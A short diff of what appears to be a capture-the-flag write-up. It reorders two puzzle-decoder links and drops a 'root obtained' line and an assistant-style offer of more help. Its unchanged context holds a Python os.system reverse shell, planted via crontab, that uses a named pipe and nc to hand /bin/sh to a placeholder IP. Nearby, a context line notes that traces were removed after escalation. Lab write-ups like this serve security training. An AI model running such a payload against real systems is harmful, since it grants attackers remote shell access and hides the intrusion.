@@ -104,8 +104,6 @@ Removed traces after escalation.
 
 ---
 
-- Morse code decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
-- Multitap cipher decoder: https://www.dcode.fr/multitap-abc-cipher
 ## Reverse Shell Payload (used in crontab)
 
 ```python
@@ -115,8 +113,5 @@ os.system("mkfifo /tmp/kirxhbg; nc <IP> 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirx
 
 ---
 
-Root obtained, flags captured.
-
----
-
-Ask if you want automation scripts or detailed steps for any part.
+- Morse code decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+- Multitap cipher decoder: https://www.dcode.fr/multitap-abc-cipher
